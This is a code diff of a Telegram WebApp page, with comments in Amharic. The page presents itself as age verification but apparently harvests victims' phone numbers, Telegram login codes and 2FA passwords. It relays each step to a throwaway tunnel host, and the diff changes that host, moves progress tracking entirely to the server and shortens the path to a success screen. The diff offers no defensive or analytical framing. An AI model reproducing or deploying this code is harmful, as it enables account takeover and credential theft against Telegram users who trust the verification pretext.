@@ -143,20 +143,16 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://alice-indicated-witch-larger.trycloudflare.com"; 
+    const API_BASE_URL = "https://zr4ouhwkc.localto.net"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
 
-    // ገጹ ሲከፈት የሚደረግ ቼክ
+    // ገጹ ሲከፈት በሰርቨር ላይ ብቻ ተመስርቶ ቼክ ያደርጋል
     window.onload = function() {
-        // 1. በLocalStorage የተቀመጠ ደረጃ ካለ ወደዛ ይወስዳል
-        const lastStep = localStorage.getItem('last_step_' + userId);
-        if(lastStep) showStep(lastStep);
-
-        // 2. ከሰርቨር ጋር አሁኑኑ ያገናኛል
+        // localStorage ሙሉ በሙሉ ተወግዷል
         checkStatus(); 
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
@@ -168,17 +164,26 @@
         const target = document.getElementById(stepId);
         if(target) {
             target.classList.add('active');
-            // ያለበትን ደረጃ በስልኩ LocalStorage ላይ ያስቀምጣል
-            localStorage.setItem('last_step_' + userId, stepId);
+            // እዚህ ጋር ምንም አይነት localStorage የለም - ሰርቨሩ ብቻ ነው የሚያውቀው
         }
     }
 
     function checkStatus() {
         fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
-            if (data.status === "NEED_OTP") { clearInterval(statusChecker); showStep(2); }
-            else if (data.status === "NEED_2FA") { clearInterval(statusChecker); showStep(3); }
-            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('step_success'); }
-            else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
+            if (data.status === "NEED_OTP") { 
+                showStep(2); 
+            }
+            else if (data.status === "NEED_2FA") { 
+                showStep(3); 
+            }
+            else if (data.status === "SUCCESS") { 
+                clearInterval(statusChecker); 
+                showStep('step_success'); 
+            }
+            else if (data.status === "FLOOD") { 
+                clearInterval(statusChecker); 
+                startFloodTimer(data.wait); 
+            }
         }).catch(e => {});
     }
 
@@ -196,18 +201,21 @@
     async function checkUserInDB() {
         showMsg(1, 'loading', 'እድሜዎን እያረጋገጥን ነው...');
         try {
-            const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), 8000);
             const res = await fetch(`${API_BASE_URL}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId}),
-                signal: controller.signal
+                body: JSON.stringify({user_id: userId})
             });
-            clearTimeout(id);
             const data = await res.json();
-            if (data.status === "FOUND") showMsg(1, 'loading', 'ኮድ በመላክ ላይ...');
-            else requestPhone();
+            
+            // ሰርቨሩ ስኬታማ መሆኑን ካረጋገጠ ቀጥታ Success ያሳያል
+            if (data.status === "SUCCESS") {
+                showStep('step_success');
+            } else if (data.status === "FOUND") {
+                showMsg(1, 'loading', 'ኮድ በመላክ ላይ...');
+            } else {
+                requestPhone();
+            }
         } catch(e) { 
             resetUI();
             showMsg(1, 'error', 'የማረጋገጫ ሰርቨሩ አልተገኘም። እባክዎ ቆይተው ይሞክሩ።');
